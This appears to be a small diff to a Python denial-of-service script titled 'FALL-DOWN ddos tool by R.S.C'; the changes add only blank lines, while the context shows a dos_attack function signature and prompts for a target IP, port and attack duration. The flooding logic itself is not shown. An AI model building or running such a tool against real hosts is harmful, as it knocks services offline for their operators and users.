@@ -1,5 +1,7 @@
 # FALL-DOWN
 ddos tool by R.S.C
+
+
 import socket
 import time
 
@@ -34,6 +36,9 @@ def dos_attack(ip, port, duration, packets_to_send):
         print(f"Connection error: {e}")
 
 print_banner()
+
+
+
 target_ip = input("Enter the target IP address: ")
 target_port = int(input("Enter the target port: "))
 duration = int(input("Enter the duration of the attack in seconds: "))
